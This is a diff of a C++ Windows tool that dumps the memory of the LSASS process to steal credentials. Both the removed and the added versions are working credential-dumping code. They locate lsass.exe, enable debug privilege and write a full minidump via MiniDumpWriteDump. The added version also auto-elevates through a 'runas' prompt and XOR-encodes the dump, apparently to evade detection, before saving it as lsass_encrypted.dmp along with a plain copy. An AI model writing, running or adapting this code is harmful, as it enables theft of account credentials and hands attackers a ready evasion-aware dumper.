@@ -1,18 +1,9 @@
-#define UNICODE
-#define _UNICODE
-
 #include <windows.h>
-#include <tlhelp32.h>
-#include <psapi.h>
 #include <iostream>
-#include <fstream>
-#include <vector>
-#include <psapi.h>
+#include <tlhelp32.h>
 #include <dbghelp.h>
+#include <vector>
 
-#define XOR_KEY 0x41
-
-#pragma comment(lib, "Psapi.lib")
 #pragma comment(lib, "Dbghelp.lib")
 
 typedef BOOL(WINAPI* MiniDumpWriteDump_t)(
@@ -60,93 +51,80 @@ BOOL CALLBACK MiniDumpCallback(
     }
 }
 
-
-
-void Log(const std::string& msg) {
-    std::ofstream log("C:\\Windows\\Temp\\lsass_dumper.log", std::ios::app);
-    log << msg << std::endl;
-    log.close();
-}
-
-
-DWORD FindLSASSPid() {
-    DWORD pid = 0;
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32 pe = { 0 };
-        pe.dwSize = sizeof(PROCESSENTRY32);
-        if (Process32First(snapshot, &pe)) {
+DWORD FindLsassPid() {
+    DWORD lsassPid = 0;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W processEntry = { 0 };
+        processEntry.dwSize = sizeof(PROCESSENTRY32W);
+        
+        if (Process32FirstW(hSnapshot, &processEntry)) {
             do {
-                if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
-                    pid = pe.th32ProcessID;
+                if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0) {
+                    lsassPid = processEntry.th32ProcessID;
                     break;
                 }
-            } while (Process32Next(snapshot, &pe));
+            } while (Process32NextW(hSnapshot, &processEntry));
         }
-        CloseHandle(snapshot);
+        CloseHandle(hSnapshot);
     }
-    return pid;
+    
+    return lsassPid;
 }
 
-bool EnableDebugPrivilege() {
-    HANDLE hToken;
-    LUID luid;
-    TOKEN_PRIVILEGES tp;
+bool EnableSeDebugPrivilege() {
+    HANDLE hToken = NULL;
+    bool result = false;
 
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-        return false;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        LUID luid;
+        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+            TOKEN_PRIVILEGES tp;
+            tp.PrivilegeCount = 1;
+            tp.Privileges[0].Luid = luid;
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
-        return false;
-
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
-}
-
-void DumpAndEncodeMemory(HANDLE hProc, std::ofstream& outFile) {
-    MEMORY_BASIC_INFORMATION mbi;
-    BYTE* addr = nullptr;
-
-    while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
-        if ((mbi.State == MEM_COMMIT) && (mbi.Type == MEM_PRIVATE || mbi.Type == MEM_IMAGE)) {
-            SIZE_T regionSize = mbi.RegionSize;
-            BYTE* buffer = new BYTE[regionSize];
-
-            SIZE_T bytesRead;
-            if (ReadProcessMemory(hProc, mbi.BaseAddress, buffer, regionSize, &bytesRead)) {
-                // XOR encode in-place
-                for (SIZE_T i = 0; i < bytesRead; ++i)
-                    buffer[i] ^= XOR_KEY;
-
-                outFile.write(reinterpret_cast<char*>(buffer), bytesRead);
-                std::wcout << L"[+] Dumped & encoded region at " << mbi.BaseAddress << L", size: " << bytesRead << L"\n";
+            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+                result = (GetLastError() == ERROR_SUCCESS);
             }
-
-            delete[] buffer;
         }
-        addr += mbi.RegionSize;
+        CloseHandle(hToken);
     }
+    return result;
 }
 
-void DumpAndEncodeMemoryMiniDump(HANDLE hProc, DWORD hPID, std::ofstream& outFile){
-    std::vector<BYTE> outputBuffer;
+bool DumpLsassToMemoryBuffer(std::vector<BYTE>& outputBuffer) {
+    outputBuffer.clear();
+
+    DWORD lsassPid = FindLsassPid();
+    if (lsassPid == 0) return false;
+
+    HANDLE hLsass = NULL;
+    DWORD accessCombinations[] = {
+        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
+        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+        PROCESS_ALL_ACCESS
+    };
+
+    for (DWORD access : accessCombinations) {
+        hLsass = OpenProcess(access, FALSE, lsassPid);
+        if (hLsass) break;
+    }
+
+    if (!hLsass) return false;
 
     WCHAR tempPath[MAX_PATH] = {};
     WCHAR tempFileName[MAX_PATH] = {};
 
-
-    // Create temp file
     if (!GetTempPathW(MAX_PATH, tempPath)) {
-        CloseHandle(hProc);
-        return;
+        CloseHandle(hLsass);
+        return false;
     }
 
     if (!GetTempFileNameW(tempPath, L"LSA", 0, tempFileName)) {
-        CloseHandle(hProc);
-        return;
+        CloseHandle(hLsass);
+        return false;
     }
 
     HANDLE hFile = CreateFileW(
@@ -160,17 +138,27 @@ void DumpAndEncodeMemoryMiniDump(HANDLE hProc, DWORD hPID, std::ofstream& outFil
     );
 
     if (hFile == INVALID_HANDLE_VALUE) {
-        CloseHandle(hProc);
-        return;
+        CloseHandle(hLsass);
+        return false;
     }
-    
-    // load dbhhelp.dll for MiniDumpWriteDump
+
     HMODULE hDbgHelp = LoadLibraryW(L"dbghelp.dll");
+    if (!hDbgHelp) {
+        CloseHandle(hFile);
+        CloseHandle(hLsass);
+        return false;
+    }
 
     auto pMiniDumpWriteDump = (MiniDumpWriteDump_t)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
+    if (!pMiniDumpWriteDump) {
+        FreeLibrary(hDbgHelp);
+        CloseHandle(hFile);
+        CloseHandle(hLsass);
+        return false;
+    }
 
-    MINIDUMP_CALLBACK_INFORMATION callbackInfo = {};
-    callbackInfo.CallbackRoutine = MiniDumpCallback;
+    // MINIDUMP_CALLBACK_INFORMATION callbackInfo = {};
+    // callbackInfo.CallbackRoutine = MiniDumpCallback;
 
     MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
         MiniDumpWithFullMemory |
@@ -183,103 +171,118 @@ void DumpAndEncodeMemoryMiniDump(HANDLE hProc, DWORD hPID, std::ofstream& outFil
     );
 
     BOOL result = pMiniDumpWriteDump(
-        hProc,
-        hPID,
+        hLsass,
+        lsassPid,
         hFile,
         dumpType,
         NULL,
         NULL,
         NULL
     );
-    if (!result){
-        // failed minidump
-        std::cerr << "Failed to dump process. Error: " << std::hex << GetLastError();
-        // cleanup
+
+    if (!result) {
         FreeLibrary(hDbgHelp);
         CloseHandle(hFile);
-        CloseHandle(hProc);
-        return;
+        CloseHandle(hLsass);
+        return false;
     }
 
     DWORD fileSize = GetFileSize(hFile, NULL);
     if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
         FreeLibrary(hDbgHelp);
         CloseHandle(hFile);
-        CloseHandle(hProc);
-        return;
+        CloseHandle(hLsass);
+        return false;
     }
 
     outputBuffer.resize(fileSize);
 
-    // Reset file pointer before reading it...
+    // Reset file pointer before reading
     if (SetFilePointer(hFile, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
         FreeLibrary(hDbgHelp);
         CloseHandle(hFile);
-        CloseHandle(hProc);
-        return;
+        CloseHandle(hLsass);
+        return false;
     }
 
     DWORD bytesRead = 0;
     if (!ReadFile(hFile, outputBuffer.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
         FreeLibrary(hDbgHelp);
         CloseHandle(hFile);
-        CloseHandle(hProc);
-        return;
+        CloseHandle(hLsass);
+        return false;
     }
 
-    // Sweet Victory! Let's encrypt this
+    // Cleanup
+    FreeLibrary(hDbgHelp);
+    CloseHandle(hFile);      
+    CloseHandle(hLsass);
 
+    return true;
+}
+
+int main() {
+    // Ensure we have admin rights
+    BOOL isAdmin = FALSE;
+    HANDLE token = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
+        TOKEN_ELEVATION elevation;
+        DWORD size = sizeof(TOKEN_ELEVATION);
+        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
+            isAdmin = elevation.TokenIsElevated;
+        }
+        CloseHandle(token);
+    }
+
+    // Auto-elevate if not admin
+    if (!isAdmin) {
+        char path[MAX_PATH] = {0};
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+        SHELLEXECUTEINFOA sei = { sizeof(sei) };
+        sei.lpVerb = "runas";
+        sei.lpFile = path;
+        sei.nShow = SW_NORMAL;
+        ShellExecuteExA(&sei);
+        return 0;
+    }
+
+    // Enable debug privilege and dump LSASS
+    EnableSeDebugPrivilege();
+    std::vector<BYTE> outputBuffer;
+        
+    if (!DumpLsassToMemoryBuffer(outputBuffer) || outputBuffer.empty() || outputBuffer.size() < 100 * 1024) {
+        return 1;
+    }
+
+
+    const BYTE XOR_KEY = 0xAA;
     for (size_t i = 0; i < outputBuffer.size(); ++i) {
         outputBuffer[i] ^= XOR_KEY;
     }
 
-    outFile.write(reinterpret_cast<char*>(outputBuffer.data()), bytesRead);
-
-
-    FreeLibrary(hDbgHelp);
-    CloseHandle(hFile);
-    CloseHandle(hProc);
-
-}
-
-int main() {
-    if (!EnableDebugPrivilege()) {
-        Log("[-] Failed to enable debug privileges.");
-        std::cerr << "[-] Failed to enable debug privileges.\n";
-        return 1;
+    // Write encrypted dump
+    HANDLE encryptedFile = CreateFileA("lsass_encrypted.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (encryptedFile != INVALID_HANDLE_VALUE) {
+        DWORD bytesWritten = 0;
+        WriteFile(encryptedFile, outputBuffer.data(), (DWORD)outputBuffer.size(), &bytesWritten, NULL);
+        CloseHandle(encryptedFile);
     }
 
-    DWORD pid = FindLSASSPid();
-    if (pid == 0) {
-        Log("[-] Could not find LSASS process.");
-        std::cerr << "[-] Could not find LSASS process.\n";
-        return 1;
-    }
-    Log("[*] Attempting to open LSASS...");
-    HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
-    if (!hProc) {
-        Log("[-] Could not open LSASS process. Run as SYSTEM.");
-        std::cerr << "[-] Could not open LSASS process. Run as SYSTEM.\n";
-        return 1;
+    // Decrypt and write decrypted dump
+    for (size_t i = 0; i < outputBuffer.size(); ++i) {
+        outputBuffer[i] ^= XOR_KEY;
     }
 
-    std::ofstream outFile("lsass_encoded.bin", std::ios::binary);
-    if (!outFile.is_open()) {
-        Log("[-] Could not open output file.");
-        std::cerr << "[-] Could not open output file.\n";
-        CloseHandle(hProc);
-
-        return 1;
+    HANDLE decryptedFile = CreateFileA("lsass_decrypted.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (decryptedFile != INVALID_HANDLE_VALUE) {
+        DWORD bytesWritten = 0;
+        WriteFile(decryptedFile, outputBuffer.data(), (DWORD)outputBuffer.size(), &bytesWritten, NULL);
+        CloseHandle(decryptedFile);
     }
-    Log("[*] LSASS process opened successfully. PID: " + std::to_string(pid));
-    std::cout << "[*] Starting LSASS memory copy + XOR encoding...\n";
-    // DumpAndEncodeMemory(hProc, outFile);
-    DumpAndEncodeMemoryMiniDump(hProc, pid, outFile);
 
-    outFile.close();
-    CloseHandle(hProc);
-    Log("[+] Dump complete. Encoded memory written to lsass_encoded.bin");
-    std::cout << "[+] Dump complete. Encoded memory written to lsass_encoded.bin\n";
+    // Free memory
+    outputBuffer.clear();
+    std::vector<BYTE>().swap(outputBuffer);
 
     return 0;
 }
